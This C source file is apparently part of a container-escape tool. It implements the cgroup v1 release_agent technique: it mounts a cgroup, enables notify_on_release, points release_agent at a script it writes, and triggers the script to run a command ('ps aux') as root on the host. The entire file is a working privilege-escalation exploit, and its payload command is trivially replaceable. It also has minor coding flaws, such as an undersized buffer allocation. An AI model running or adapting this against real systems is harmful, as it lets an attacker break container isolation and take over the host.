#define _GNU_SOURCE
//
// Created by FlagT on 2022/6/22.
//

#include "release_agent.h"
#include <sched.h>
#include <unistd.h>
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <sys/mount.h>
#include <signal.h>
#include "../util/random_str.h"

#define STACK_SIZE (1024 * 1024)

struct cgroup_procs_clone_args {
    char *cgroup_procs_path;
};

int clear_cgroup_procs(void *args) {
    int fd;
    char pid[10];
    struct cgroup_procs_clone_args *arg = (struct cgroup_procs_clone_args *) args;
    struct cgroup_procs_clone_args *cgroup_procs_args = (struct cgroup_procs_clone_args *) malloc(
            sizeof(struct cgroup_procs_clone_args));
    memcpy(cgroup_procs_args, arg, sizeof(struct cgroup_procs_clone_args));
    cgroup_procs_args->cgroup_procs_path = (char *) malloc(strlen(arg->cgroup_procs_path) * sizeof(char));
    strcpy(cgroup_procs_args->cgroup_procs_path, arg->cgroup_procs_path);

    sprintf(pid, "%d", getpid());

    printf("[INFO] Echo pid: %s to %s\n", pid, cgroup_procs_args->cgroup_procs_path);

    fd = open(cgroup_procs_args->cgroup_procs_path, O_WRONLY);
    write(fd, pid, strlen(pid));
    close(fd);
}

int escape_by_release_agent(char *container_path_in_host) {
//    Mount Cgroup
//    Create cgroup mount path as clion remote development path e.g. "tmp.RwYWARK7Me"
    printf("[INFO] Start escape by release_agent\n");
    const int cgroup_path_random_length = 10;
    const int controller_path_random_length = 5;
    const int release_agent_exp_path_length = 5;
    char mount_path[128] = "/tmp/tmp.";
    char *controller = "rdma";
    char controller_path[128];
    char release_agent_path[128];
    char notify_on_release_path[128];
    char release_agent_exp_path[256];
    char exp_path[128] = "/tmp/";
    char *cmd = "ps aux";
    char exp[2048] = "#!/bin/sh\n";
    char cgroup_procs_path[256];
    char *cgroup_path_random = malloc(cgroup_path_random_length + 1);
    rand_string(cgroup_path_random, cgroup_path_random_length);
    strcat(mount_path, cgroup_path_random);
    struct stat st = {0};
    if (stat(mount_path, &st) == -1) {
        mkdir(mount_path, 0700);
    }
    printf("[INFO] Cgroup mount path: %s\n", mount_path);
    if (mount("cgroup", mount_path, "cgroup", 0, controller)) {
        perror("mount failed");
    }

    char *controller_path_random = malloc(controller_path_random_length + 1);
    rand_string(controller_path_random, controller_path_random_length);
    strcpy(controller_path, mount_path);
    strcat(controller_path, "/");
    strcat(controller_path, controller_path_random);
    printf("[INFO] New cgroup controller path: %s\n", controller_path);
    if (stat(controller_path, &st) == -1) {
        mkdir(controller_path, 0777);
    }

    strcpy(notify_on_release_path, controller_path);
    strcat(notify_on_release_path, "/notify_on_release");

    printf("[INFO] Enable notify_on_release: %s\n", notify_on_release_path);

    int fd;
    fd = open(notify_on_release_path, O_WRONLY);
    write(fd, "1", 1);
    close(fd);

    strcpy(release_agent_path, mount_path);
    strcat(release_agent_path, "/release_agent");
    printf("[INFO] Path of release_agent: %s\n", release_agent_path);

    char *release_agent_exp_path_random = malloc(release_agent_exp_path_length + 1);
    rand_string(release_agent_exp_path_random, release_agent_exp_path_length);
    strcpy(release_agent_exp_path, container_path_in_host);
    strcat(release_agent_exp_path, "/tmp/");
    strcat(release_agent_exp_path, release_agent_exp_path_random);
    printf("[INFO] Write exp_path to release_agent: %s\n", release_agent_exp_path);
    fd = open(release_agent_path, O_WRONLY);
    ssize_t len = write(fd, release_agent_exp_path, strlen(release_agent_exp_path));
    if (len < 0) {
        perror("[ERROR] Write failed");
    }
    close(fd);

    strcat(exp_path, release_agent_exp_path_random);
    printf("[INFO] Exp path: %s\n", exp_path);

    fd = open(exp_path, (O_CREAT | O_WRONLY | O_TRUNC));
    strcat(exp, cmd);
    strcat(exp, " > ");
    strcat(exp, container_path_in_host);
    strcat(exp, "/output");
    write(fd, exp, strlen(exp));
    close(fd);

    // rwx--x--x
    int exp_mode = S_IRUSR | S_IWUSR | S_IXUSR | S_IXGRP | S_IXOTH;
    chmod(exp_path, exp_mode);

    strcpy(cgroup_procs_path, controller_path);
    strcat(cgroup_procs_path, "/cgroup.procs");

    struct cgroup_procs_clone_args args;
    args.cgroup_procs_path = cgroup_procs_path;
    void *arg = (void *) &args;

    clone(clear_cgroup_procs, malloc(STACK_SIZE) + STACK_SIZE, SIGCLD, arg);
}